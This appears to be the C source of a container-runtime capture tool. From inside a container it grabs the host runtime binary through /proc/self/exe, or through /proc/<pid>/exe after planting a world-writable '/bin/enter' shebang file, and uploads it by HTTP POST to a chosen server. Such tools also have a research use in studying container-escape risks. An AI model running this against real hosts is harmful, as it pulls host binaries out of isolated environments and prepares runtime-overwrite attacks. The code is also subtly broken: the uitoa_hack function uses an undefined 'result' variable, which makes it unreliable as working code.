#include "upload_runtime.h"



void print_help(void)
{
	char * help_format = \
"Usage: upload_runtime [options] <server_ip>\n\n"
"Options:\n"
" -p, --port                 Port of remote server, defaults to %d\n"
" -e, --exec                 Wait for exec mode for static container runtimes, wait until an exec to the container occurred\n"
" -a, --exec-extra-argument  In exec mode, pass an additional argument to the runtime so it won't exit quickly (e.g. '--help')\n"
" -c, --pid-count            In exec mode, how many pids to check when searching for the runtime process, defaults to %d\n";
	
	printf(help_format, DEFAULT_PORT, DEFAULT_PID_COUNT);
}



int parse_arguments(config * conf, int argc, char const *argv[])
{
	int opt;
	while ((opt = getopt_long(argc, (char * const*)argv, "p:c:a:e", long_options, NULL)) != -1)
	{
		switch (opt) 
		{
			case 'p':
				conf->port = atoi(optarg);
				break;
			case 'e':
			 	conf->wait_for_exec = true;
				break;
			case 'a':
				conf->exec_extra_arg = optarg;
				break;
			case 'c':
				conf->pid_count = atoi(optarg);
				break;
			default: /* '?' */
				print_help();
				return 1;
		}
	}
	if (optind >= argc) 
	{
    	print_help();
    	return 1;
    }
    conf->server_ip = argv[optind];
    return 0;

}



bool send_post_file_http_header(int sockfd, const char * server_ip, unsigned long long file_size, const char * filename)
{
	char header[HEADER_BUF_SIZE];
	char * header_format;
	int rc;

	if (filename != NULL)
	{
		header_format =
		  "POST / HTTP/1.1\r\n"
	      "Host: %s\r\n"
	      "Content-Type: application/octet-stream\r\n"
	      "Content-Length: %llu\r\n" 
	      "Content-Disposition: attachment; filename=\"%s\"\r\n"
	      "Connection: close\r\n"
	      "\r\n";

	   	rc = snprintf(header, HEADER_BUF_SIZE, header_format, server_ip, file_size, filename);
	}
	else
	{
		header_format =
		  "POST / HTTP/1.1\r\n"
	      "Host: %s\r\n"
	      "Content-Type: application/octet-stream\r\n"
	      "Content-Length: %llu\r\n" 
	      "Content-Disposition: attachment\r\n"
	      "Connection: close\r\n"
	      "\r\n";

	   	rc = snprintf(header, HEADER_BUF_SIZE, header_format, server_ip, file_size);
	}

	if (rc < 0) 
	{
	   	printf("[!] send_http_header: snprintf(header) failed with '%s'\n", strerror(errno));
	   	return false;
	}
	if (rc >= HEADER_BUF_SIZE)
	{
	   	printf("[!] send_http_header: snprintf(header) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, HEADER_BUF_SIZE);
	   	return false;
	}

   	return send_all(sockfd, (void *) header, (size_t) strlen(header));

}

bool prepare_enter_bin_for_exec(const char * enter_bin_path, const char * extra_arg)
{
	FILE * enter_fp;
	char shebang_buff[SMALL_BUF_SIZE];
	unsigned int extra_arg_len;
	int rc;

	if (extra_arg)
	{
		extra_arg_len = strlen(extra_arg);
		if (extra_arg_len > SMALL_BUF_SIZE - 20) // 20 to save room for '#!/proc/self/exe '
		{
			printf("[!] prepare_enter_bin_for_exec: exec_extra_arg too long (is %u while max is %u)\n", extra_arg_len, SMALL_BUF_SIZE - 20);
			return false;
		}

		rc = snprintf(shebang_buff, SMALL_BUF_SIZE, "#!/proc/self/exe %s", extra_arg);
		if (rc < 0) 
		{
	   		printf("[!] send_http_header: snprintf(header) failed with '%s'\n", strerror(errno));
	   		return false;
		} // intentionally not checking if rc >= SMALL_BUF_SIZE, as verifying the strlen(extra_arg) should be enough
	}
	else
		strcpy(shebang_buff, "#!/proc/self/exe");

	// Open file
	enter_fp = fopen(enter_bin_path, "w");
	if (!enter_fp)
	{
		printf("[!] prepare_enter_bin_for_exec: fopen(enter_bin_path) failed with '%s'\n", strerror(errno));
		return false;
	}

	// Write shebang line to file
	if (fputs(shebang_buff, enter_fp) == EOF)
	{
		printf("[!] prepare_enter_bin_for_exec: fputs() failed with '%s'\n", strerror(errno));
		fclose(enter_fp);
		return false;
	}

	// chmod(enter_bin_path, 0777) 
	if (chmod(enter_bin_path, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) < 0)
	{
		printf("[!] prepare_enter_bin_for_exec: chmod(enter_bin_path) failed with '%s'\n", strerror(errno));
		fclose(enter_fp);
		return false;
	}

	fclose(enter_fp);
	return true;

}


int guess_next_pid()
{
	pid_t child_pid;
    child_pid = fork();

    if(child_pid >= 0) // fork was successful
    {
        if (child_pid == 0) // child process
        	exit(EXIT_SUCCESS);
        else //Parent process
        {
    		wait(NULL);
    		return child_pid + 1;
        }
    }
    else // fork failed
    {
        printf("[!] guess_next_pid: fork() failed with '%s'\n",strerror(errno));
        return -1;
    }

}


char* uitoa_hack(unsigned int value, char* target, unsigned int length)
{
	unsigned int curr_original_val;
	char* ptr = result + length - 1;
	do {
		curr_original_val = value;
		value /= 10;
		*ptr-- = "0123456789" [curr_original_val - (value * 10)];
	} while ( value );
	return result;
}


int main(int argc, char const *argv[])
{
	int sockfd, guessed_next_pid, runtime_fd = -1;
	struct stat file_info;
    char runtime_path_buf[SMALL_BUF_SIZE];  
    char * runtime_path, *runtime_link;
    size_t rc;

    config conf = {
		.server_ip = NULL, 
		.port = DEFAULT_PORT, 
		.wait_for_exec = false,
		.exec_extra_arg = NULL,
		.pid_count = DEFAULT_PID_COUNT
	};
	if (parse_arguments(&conf, argc, argv) != 0)
		return 1;

	/* Get a fd for the container runtime */
	if (!conf.wait_for_exec)
	{
		// Running as the dynamic linker of the runtime process, so the runtime should be accessible at /proc/self/exe
		runtime_link = "/proc/self/exe";
		runtime_fd = open(runtime_link, O_RDONLY); 
	  	if (runtime_fd < 0)
	  	{
	  		printf("[!] main: open(\"/proc/self/exe\") failed with '%s'\n", strerror(errno));
	  		return 1;
	  	}
	}
	else
	{   
		// Running as a normal process in the container, waiting for the runtime to exec in
		char link_template[] = "/proc//////exe";  // formated to leave space for 4 digits (/proc/----/exe)
		pid_t curr_pid, biggest_checked_pid;

		// Create the /bin/enter file containing a shebang that points to the container runtime (#!/proc/self/exe)
		if (prepare_enter_bin_for_exec(DEFAULT_EXEC_ENTER_BIN, conf.exec_extra_arg) == false)
			return 1;  // error printed in prepare_enter_bin_for_exec()

		// Try to guess as what pid the runtime process will pop up as in our pid ns
		guessed_next_pid = guess_next_pid();
		if (guessed_next_pid < 0)
			return 1; // error printed in guess_next_pid
		biggest_checked_pid = (unsigned int)(guessed_next_pid) + conf.pid_count;
		if (biggest_checked_pid > MAX_PID)  
		{
			printf("[!] main: pid (%u) too large (max %u) for our hacky way of catching the runtime process\n", biggest_checked_pid, MAX_PID);
			return 1; // TODO: perhaps instead of exiting, set biggest_checked_pid=MAX_PID given that guessed_next_pid < MAX_PID
		}

		printf("[+] Waiting for runtime to exec into container... (do 'whoc-ctr-name exec /bin/enter') \n");
		while (runtime_fd < 0)
		{
			for (curr_pid = guessed_next_pid; curr_pid < biggest_checked_pid; ++curr_pid)
			{
				// TODO: We're trying to be faster than sprintf("/proc/%d/exe", currentpid), is this really better?
				uitoa_hack(curr_pid, link_template + 6, 4); // copy curr_pid to /proc/{}/exe (strlen('/proc/')=6, strlen('////')=4)
				runtime_fd = open(link_template, O_RDONLY);
				if (runtime_fd > 0)
					break;
				memcpy(link_template + 6, "////" , 4);    // restore link_template to /proc//////exe
			}
		}
		runtime_link = link_template;
		printf("[+] Got runtime as /proc/%u/exe\n", curr_pid);
	}

	// get container runtime size
	if(fstat(runtime_fd, &file_info) != 0)
	{
		printf("[!] upload_file: fstat(fp) failed with '%s'\n", strerror(errno));
		goto close_runtime_ret_1;
	}
    rc = readlink(runtime_link, runtime_path_buf, SMALL_BUF_SIZE);
    if (rc < 0)
    {
        printf("[!] main: readlinkat(runtime_fd) failed with '%s', continuing without the runtime's path\n", strerror(errno));
        runtime_path = NULL;
    }
    else
    {
    	runtime_path_buf[rc] = 0;
    	runtime_path = runtime_path_buf;
    }

    printf("[+] Uploading...\n");
	/* connect to server */
	sockfd = connect_to_server(conf.server_ip, conf.port, SEND_TIMEOUT, RECV_TIMEOUT);
	if (sockfd < 0)
		return 1;  // error printed in connect_to_server()


	/* send POST http header */
	if (send_post_file_http_header(sockfd, conf.server_ip, (unsigned long long)file_info.st_size, runtime_path) == false)
		goto close_both_ret_1;

	/* send container runtime to  server */
	if (sendfile_all(sockfd, runtime_fd, (size_t)file_info.st_size) == false)
		goto close_both_ret_1;

	printf("[+] Done\n");
	return 0;

close_both_ret_1:
    close(sockfd);
close_runtime_ret_1:
    close(runtime_fd); 
	return 1;
}
